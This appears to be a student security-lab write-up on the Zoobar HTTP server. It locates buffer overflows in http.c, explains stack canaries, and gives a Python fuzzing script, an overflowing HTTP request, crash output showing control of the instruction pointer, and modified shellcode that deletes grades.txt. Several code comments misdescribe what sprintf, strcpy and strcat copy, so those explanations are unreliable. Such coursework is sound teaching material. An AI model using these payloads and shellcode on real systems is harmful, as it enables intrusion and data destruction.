## Zoobar HTTP Server vulnerabilities

I first started to look for any vulnerable functions within the program that are known to be vulnerable to buffer overflows. OWASP states the following: "C library functions such as strcpy (), strcat (), sprintf () and vsprintf () operate on null terminated strings and perform no bounds checking." So these particular functions were the ones I was interested in if they were being used by the program.

[http.c:165] 
The program allocates 8192 bytes for the variable 'buf' and 512 bytes for the variable 'envvar'. The envvar variable can be overwritten by the sprintf function, because it does not perform any bounds checking for the buffer size.

    static char buf[8192];   // Here the program allocates the 8192 bytes for the variable 'buf'
    char envvar[512]; // Here it allocates 512 bytes for the variable 'envvar'
    ...
    ...
    ...
    sprintf(envvar, "HTTP_%s", buf); // Here sprintf will copy the content of envvar to buf

If the input exceeds the 512 byte limit it will overflow the buffer and we as an attacker will have control of the execution of the program. There are also other functions that does not perform bound checking and are prone to buffer overflow related attacks. 

For example, as an attack payload we can send the following HTTP Request that will overflow the buffer with a malicious HTTP header:

    GET / HTTP/1.1
    Host: 192.168.239.153
    HTTP_BBBBBBBBBBBB.......BBBBBBBB: foo
    Connection: Close

------

[http.c:282]
In the 'http_serve' function the program allocates 1024 bytes for a variable 'pn'. Then it uses the vulnerable 'strcat' function that does not perform bounds checking when concatenating to destination 'name'.

    void http_serve(int fd, const char *name)
    {
    void (*handler)(int, const char *) = http_serve_none;
    char pn[1024];
    struct stat st;

    getcwd(pn, sizeof(pn));
    setenv("DOCUMENT_ROOT", pn, 1);

    strcat(pn, name); // Here it uses the strcat function to append a copy of the source string to the destination variable 'name'

If we as an attacker provide more than the allocated 1024 bytes in the buffer for the 'pn' variable we can overflow the buffer.

------

[http.c:344]
In the 'dir_join' function the program uses another vulnerable function - strcpy, which does not check buffer lengths and just copies given input into the buffer.

    strcpy(dst, dirname); // Here the program uses strcpy function to copy the 'dst' variable input into 'dirname' variable

------

[http.c:347]
In the 'dir_join' function the program also uses 'strcat', which does not check buffer lengths and just concatenates user input as is.

    strcat(dst, filename); // Here the program uses strcat function to copy the 'dst' variable input into 'filename' variable

------

## Stack canaries

Linux systems has a protection mechanism against buffer overflow attacks, known as canaries. The idea behind a stack canary is to place a 4-byte value onto the stack after the buffer and before the return pointer. The point in the canary is that if we as an attacker overflow the buffer and the canary value is not the same upon function completion as when it was pushed onto the stack, a function is called to terminate the process.

There are three main types of canaries:
######Terminator canary
    0x00000aff & 0x000aff0d
######Random canary
    random 4-byte value protected in memory
######Null canary
    0x00000000

The idea behind a terminator canary is to cause string operations to terminate when trying to overwrite the buffer and return pointer. It is possible for an attacker to place same value in the attack payload that will overwrite the terminator canary value and pass as valid.

Random canary is more preferred method over terminator canary. It is a randomly generated 4-byte value placed onto the stack. It is important to use enough entropy when generating random 4-byte values as otherwise it can be possible for an attacker to brute force the canary value.

Null canary is the weakest option of the three. The canary is a 4-byte value containing all 0s, this is very trivial for an attacker to bypass.

------

## Exploits

For the second vulnerability we chose to exploit was how the zoobar HTTP server handles HTTP requests headers. If we as an attacker create an arbitrary header that exceeds the 'envvar' variable 512 bytes, we successfully corrupt the memory of the zoobar process.

    # Fuzzed HTTP Requests trying to find
    # the maximum size that the server
    # can handle

    import sys, socket, time
    
    # Use in the form "python httpfuzz.py host port"

    host = sys.argv[1] # Recieve IP from user
    port = int(sys.argv[2]) # Recieve Port from user

    length = 100 # Initial length of 100 A's

    while (length < 11000): # Stop once we've tried up to 3000 length
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
        client.connect((host, port)) # Connect to user supplied port and IP address

        command = "GET / HTTP/1.1\r\nHost: " + host + "HTTP_" + length * "B" + ": foo" + "\r\nConnection: Close\r\n\r\n"
        client.send(command) # Send the user command with a variable length name
        data = client.recv(1024) # Recieve Reply
        client.close() # Close the Connection
        time.sleep(2)
        print "Length Sent: " + str(length) # Output length of the request
        length += 100 # Try again with an increased length

The memory corruption happens after we have sent little over 500 bytes:

    Length Sent: 500
    Traceback (most recent call last):
      File "fuzzer.py", line 20, in <module>
        data = client.recv(1024) # Recieve Reply
    socket.error: [Errno 54] Connection reset by peer

If we look at the status of dmesg, we can see the following:

    [ 9611.046876] zookfs-exstack[3471]: segfault at 42424242 ip 42424242 sp bfffde00 error 14

------

## Unlinking grades.txt

For the buffer overflow exploit we were required to modify the Aleph One's shellcode in a way that it will use the Linux syscall unlink that will remove the /home/httpd/grades.txt file from the machine. Below we have provided the modified shellcode.S file to achieve this goal:

    #include <sys/syscall.h>

    #define STRING	"/home/httpd/grades.txt" /* Provide the filepath to the grades.txt file */
    #define STRLEN	22 /* Length of the string for the target file */
    #define ARGV	(STRLEN+1)
    #define ENVP	(ARGV+4)

    .globl main
    	.type	main, @function

     main:
    	jmp	calladdr

     popladdr:
    	popl	%esi
    	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
    	xorl	%eax,%eax		/* get a 32-bit zero value */
    	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
    	movl	%eax,(ENVP)(%esi)	/* set up null envp */

    	movb	$SYS_unlink,%al		/* syscall arg 1: syscall for unlink */
    	movl	%esi,%ebx		/* syscall arg 2: string pathname */
    	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
    	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
    	int	$0x80			/* invoke syscall */

    	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
    	movl	%ebx,%eax
    	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
        					/* mov+inc to avoid null byte */
    	int	$0x80			/* invoke syscall */

     calladdr:
    	call	popladdr
    	.ascii	STRING

We modified the STRING and STRLEN values to match the file path of the grades.txt and the length of the string. We also changed the syscall command from 'execve' to 'unlink'. This was all that was required to achieve the goal to have the shellcode remove the grades.txt file from the target machine.

------
